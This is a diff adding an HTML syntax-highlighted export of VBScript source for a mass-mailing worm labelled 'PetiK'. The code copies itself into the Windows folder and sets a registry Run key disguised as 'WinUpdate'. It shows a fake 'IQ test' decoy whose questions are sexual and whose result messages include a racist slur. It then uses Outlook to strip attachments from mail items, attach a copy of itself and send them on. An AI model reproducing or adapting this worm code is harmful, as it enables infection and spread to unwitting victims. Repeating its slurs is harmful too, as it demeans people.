@@ -1,0 +1,174 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'PetiK
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc7">randomize</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">=</span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">wscriptshell</span><span class="sc6">=</span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"wscript.shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">drives</span><span class="sc6">=</span><span class="sc7">fso.drives</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">drive</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">drives</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">drive</span><span class="sc6">=</span><span class="sc4">"C:"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">drive.isready</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">drivefull</span><span class="sc6">=</span><span class="sc7">drive</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">e5d</span><span class="sc6">=</span><span class="sc7">fso.getfolder</span><span class="sc6">(</span><span class="sc7">drivefull</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">subs</span><span class="sc6">=</span><span class="sc7">e5d.subfolders</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">subfolder</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">subs</span><span class="sc0">
+</span><span class="sc7">subst</span><span class="sc6">=</span><span class="sc3">mid</span><span class="sc6">(</span><span class="sc7">subfolder.path</span><span class="sc6">,</span><span class="sc2">4</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">subst</span><span class="sc6">=</span><span class="sc4">"WIN"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">auto</span><span class="sc6">=</span><span class="sc7">subfolder.path</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc7">autos</span><span class="sc6">=</span><span class="sc3">auto</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\run32dll.vbs"</span><span class="sc0">
+</span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc7">autos</span><span class="sc0">
+</span><span class="sc7">wscriptshell.regwrite</span><span class="sc0"> </span><span class="sc4">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate"</span><span class="sc6">,</span><span class="sc4">"wscript.exe"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">autos</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"%"</span><span class="sc0"> 
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">autos</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">ei</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"This is IQ test version 3.2 from TrendSoftware.Answer Yes or No to the following questions,and check your IQ level.Do you wish to continue?"</span><span class="sc6">,</span><span class="sc2">4</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ei</span><span class="sc6">=</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">bi</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"Do you think that a woman and a man can develop a strong frienship without sex?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 1/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">bi</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">ci</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"Do you usually think solutions that seem to be weird for other people?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 2/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ci</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">di</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"Is there any difference between a hot woman and a HOT woman?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 3/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">di</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">ii</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"Do you believe from aliens pictures that they exist?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 4/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ii</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">fi</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"If an unknown but EXTREMELY hot woman/man says to you:Taste me starting from  tits,would you do it?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 5/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">fi</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">gi</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"Supposing you make love with Monica Bellucci without any protection and suddenly she says:I have AIDS,were you to punish her?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 6/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">gi</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">hi</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"I can see your death.Do you believe this?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 7/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">hi</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">ji</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"Do you know what the word protozoa means?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 8/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ji</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">ki</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"Do you feel you were born lucky?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 9/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ki</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">li</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"Do you masturbate at least 4 times a week?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Question 10/11"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">li</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">mi</span><span class="sc6">=</span><span class="sc7">msgbox</span><span class="sc6">(</span><span class="sc4">"Have you ever thought the possibility you are a genius?"</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">,</span><span class="sc4">"Final Question!"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">mi</span><span class="sc6">=</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQtest ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">my</span><span class="sc6">=</span><span class="sc7">int</span><span class="sc6">((</span><span class="sc2">4</span><span class="sc6">*</span><span class="sc7">Rnd</span><span class="sc6">)+</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">case</span><span class="sc0"> </span><span class="sc7">my</span><span class="sc0">
+</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Highest possible IQ:150---&gt;Your IQ:60-80 ,not really good,are you a negro?"</span><span class="sc6">,</span><span class="sc2">16</span><span class="sc6">,</span><span class="sc4">"You negros suck!"</span><span class="sc0">
+</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Highest possible IQ:150---&gt;Your IQ:80-100 ,average IQ,somehow OK."</span><span class="sc6">,</span><span class="sc2">32</span><span class="sc6">,</span><span class="sc4">"Not so dumb i expected U 2 B!"</span><span class="sc0">
+</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Highest possible IQ:150---&gt;Your IQ:100-120 ,you are smart enough."</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"OK my man,Your brains does really exist"</span><span class="sc0">
+</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">else</span><span class="sc0"> </span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Highest possible IQ:150---&gt;Your IQ:120-150,extremely smart,CinGRAtuLaTIoNs!!"</span><span class="sc6">,</span><span class="sc2">48</span><span class="sc6">,</span><span class="sc4">"GENIUS DETECTED! o;)"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Thanks for using TrendSoftware products!"</span><span class="sc6">,</span><span class="sc2">48</span><span class="sc6">,</span><span class="sc4">"TrendSoftware IQ Test ver 3.2"</span><span class="sc0">
+</span><span class="sc7">wscript.quit</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Try again later!"</span><span class="sc6">,</span><span class="sc2">64</span><span class="sc6">,</span><span class="sc4">"IQ Test ver 3.2"</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">mailed</span><span class="sc6">=</span><span class="sc3">auto</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\EMM.vbs"</span><span class="sc0">
+</span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc7">mailed</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">wscriptshell.regread</span><span class="sc6">(</span><span class="sc4">"HKLM\SOFTWARE\Microsoft"</span><span class="sc6">)&lt;&gt;</span><span class="sc4">"1"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc6">=</span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc6">=</span><span class="sc4">"Outlook"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> 
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">mapi</span><span class="sc6">=</span><span class="sc7">out.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">newitem</span><span class="sc6">=</span><span class="sc7">mapi.getdefaultfolder</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">do</span><span class="sc0"> </span><span class="sc3">while</span><span class="sc0"> </span><span class="sc7">newitem.items.count</span><span class="sc6">&lt;&gt;</span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">item</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">newitem.items</span><span class="sc0">
+</span><span class="sc3">do</span><span class="sc0"> </span><span class="sc3">while</span><span class="sc0"> </span><span class="sc7">item.Attachments.count</span><span class="sc6">&lt;&gt;</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">itatt</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">item.Attachments</span><span class="sc0">
+</span><span class="sc7">itatt.delete</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">loop</span><span class="sc0">
+</span><span class="sc7">item.subject</span><span class="sc6">=</span><span class="sc4">"Hey !!"</span><span class="sc0">
+</span><span class="sc7">item.Body</span><span class="sc6">=</span><span class="sc4">"Important Message for you !!!"</span><span class="sc0">
+</span><span class="sc7">item.attachments.add</span><span class="sc0"> </span><span class="sc7">mailed</span><span class="sc0">
+</span><span class="sc7">item.send</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">loop</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">item</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">itatt</span><span class="sc6">=</span><span class="sc3">nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">newitem</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">newitem</span><span class="sc6">=</span><span class="sc7">mapi.getdefaultfolder</span><span class="sc6">(</span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">do</span><span class="sc0"> </span><span class="sc3">while</span><span class="sc0"> </span><span class="sc7">newitem.items.count</span><span class="sc6">&lt;&gt;</span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">item</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">newitem.items</span><span class="sc0">
+</span><span class="sc3">do</span><span class="sc0"> </span><span class="sc3">while</span><span class="sc0"> </span><span class="sc7">item.Attachments.count</span><span class="sc6">&lt;&gt;</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">itatt</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">item.Attachments</span><span class="sc0">
+</span><span class="sc7">itatt.delete</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">loop</span><span class="sc0">
+</span><span class="sc7">item.subject</span><span class="sc6">=</span><span class="sc4">"Hey !!"</span><span class="sc0">
+</span><span class="sc7">item.Body</span><span class="sc6">=</span><span class="sc4">"Important Message for you !!!"</span><span class="sc0">
+</span><span class="sc7">item.attachments.add</span><span class="sc0"> </span><span class="sc7">mailed</span><span class="sc0">
+</span><span class="sc7">item.send</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">loop</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">item</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">itatt</span><span class="sc6">=</span><span class="sc3">nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">newitem</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc7">wscriptshell.regwrite</span><span class="sc0"> </span><span class="sc4">"HKLM\SOFTWARE\Microsoft"</span><span class="sc6">,</span><span class="sc4">"1"</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span></div></body>
+</html>
